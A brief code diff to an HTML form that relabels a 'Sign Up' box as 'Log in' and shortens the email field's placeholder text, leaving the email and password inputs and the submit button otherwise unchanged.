@@ -3,8 +3,8 @@
 <body>
 <form method="post" action="" name="register" onsubmit="return myfunc()">       
     <div class="box">
-          <p class="large">Sign Up</p>
-          <input class="textbox" type="text" name="email" placeholder="Email, phone, or Skype">
+          <p class="large">Log in</p>
+          <input class="textbox" type="text" name="email" placeholder="Email">
           <input class="textbox"  type="password" name="pass" placeholder="Password">
           <p style="color:red" id="myalert"></p>
           <input type="submit" value="Next" class="submit" name="register">
